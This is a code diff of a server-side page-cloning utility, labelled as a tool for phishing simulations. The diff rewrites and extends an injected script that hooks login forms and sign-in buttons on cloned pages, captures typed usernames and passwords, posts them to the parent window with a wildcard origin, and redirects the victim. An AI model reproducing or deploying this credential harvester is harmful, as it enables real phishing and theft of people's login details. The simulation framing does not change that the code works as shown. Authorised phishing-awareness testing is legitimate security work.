@@ -1,3 +1,4 @@
+
 'use server';
 /**
  * @fileOverview A server-side utility for cloning a web page for phishing simulations.
@@ -23,57 +24,68 @@ export type PageClonerOutput = z.infer<typeof PageClonerOutputSchema>;
 
 const getHarvesterScript = (redirectUrl: string) => `
 <script>
-  // Wait for the DOM to be fully loaded
   document.addEventListener('DOMContentLoaded', (event) => {
     // Find all forms on the page
     const forms = document.querySelectorAll('form');
 
     forms.forEach(form => {
-      // Look for a password field within the form
       const passwordInput = form.querySelector('input[type="password"]');
-      
-      if (passwordInput) {
-        // We found a likely login form, let's attach our harvester
-        form.addEventListener('submit', function(e) {
-          e.preventDefault(); // Prevent the form from submitting normally
+      if (!passwordInput) return; // Not a login form
 
-          // Find username/email and password fields
-          let username = '';
-          let password = '';
+      const harvestAndRedirect = () => {
+        let username = '';
+        const usernameSelectors = [
+          'input[type="email"]',
+          'input[name*="user"]',
+          'input[name*="login"]',
+          'input[id*="user"]',
+          'input[id*="login"]',
+          'input[type="text"]' // Fallback
+        ];
 
-          // Common names/ids for username fields
-          const usernameSelectors = [
-            'input[type="email"]',
-            'input[name*="user"]',
-            'input[name*="login"]',
-            'input[id*="user"]',
-            'input[id*="login"]',
-            'input[type="text"]' // Fallback
-          ];
-          
-          for(const selector of usernameSelectors) {
-              const usernameField = form.querySelector(selector);
-              if (usernameField) {
-                  username = usernameField.value;
-                  break;
-              }
+        for (const selector of usernameSelectors) {
+          const usernameField = form.querySelector(selector);
+          // Make sure we don't select the password field as the username field
+          if (usernameField && usernameField.type !== 'password') {
+            username = usernameField.value;
+            break;
           }
-          
-          password = passwordInput.value;
+        }
+        
+        const password = passwordInput.value;
 
-          // Send the captured data to the parent window (our app)
-          window.parent.postMessage({ 
-            type: 'credential-capture', 
-            username: username, 
-            password: password 
-          }, '*');
+        // Only post message if we have something
+        if (username || password) {
+            window.parent.postMessage({ 
+                type: 'credential-capture', 
+                username: username, 
+                password: password 
+            }, '*');
+        }
 
-          // Redirect the user to the specified URL
-          setTimeout(() => {
+        // Redirect after a short delay to ensure message is sent
+        setTimeout(() => {
             window.location.href = '${redirectUrl}';
-          }, 500);
-        });
-      }
+        }, 500);
+      };
+
+      // Handle standard form submission
+      form.addEventListener('submit', (e) => {
+        e.preventDefault();
+        harvestAndRedirect();
+      });
+
+      // Also handle clicks on submit buttons for JS-driven forms
+      form.querySelectorAll('button[type="submit"], input[type="submit"], [role="button"]').forEach(button => {
+        // Check if the button is likely a submit button
+        const buttonText = (button.textContent || button.value || '').toLowerCase();
+        if (buttonText.includes('sign in') || buttonText.includes('log in') || buttonText.includes('submit')) {
+            button.addEventListener('click', (e) => {
+                e.preventDefault();
+                harvestAndRedirect();
+            });
+        }
+      });
     });
   });
 </script>
